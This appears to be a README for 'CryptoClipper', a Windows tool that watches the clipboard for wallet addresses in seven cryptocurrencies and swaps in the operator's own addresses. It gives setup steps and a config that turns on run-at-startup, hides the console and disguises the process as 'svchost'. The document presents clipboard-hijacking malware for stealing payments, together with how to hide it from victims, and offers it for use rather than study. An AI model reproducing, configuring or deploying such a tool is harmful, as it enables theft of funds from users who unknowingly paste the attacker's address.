# CryptoClipper

Clipboard monitor that detects cryptocurrency wallet addresses and replaces them.

## Supported Coins

| Coin | Format |
|------|--------|
| BTC | Legacy `1...` / SegWit `3...` / Bech32 `bc1...` |
| ETH | `0x...` (40 hex chars) |
| LTC | Legacy `L...` / `M...` / Bech32 `ltc1...` |
| XMR | `4...` (95-106 chars) |
| XRP | `r...` (25-35 chars) |
| DOGE | `D...` (34 chars) |
| SOL | Base58 (32-44 chars) |

## Setup

1. Edit `config.py` and replace wallet placeholders with your addresses
2. Run:

```
python main.py
```

## Config

```python
w = {
    "btc": "YOUR_BTC_ADDRESS_HERE",
    "eth": "YOUR_ETH_ADDRESS_HERE",
    ...
}
interval = 0.5          # clipboard poll rate (seconds)
startup = True          # run on startup
hide_console = True     # hide console window
process_name = "svchost"
```

## Structure

```
├── main.py          # entry point
├── config.py        # wallets + settings
├── clipper.py       # clipboard monitor
└── utils/
    └── regex.py     # address patterns
```

## Requirements

- Python 3.6+
- Windows 10/11
- No external dependencies
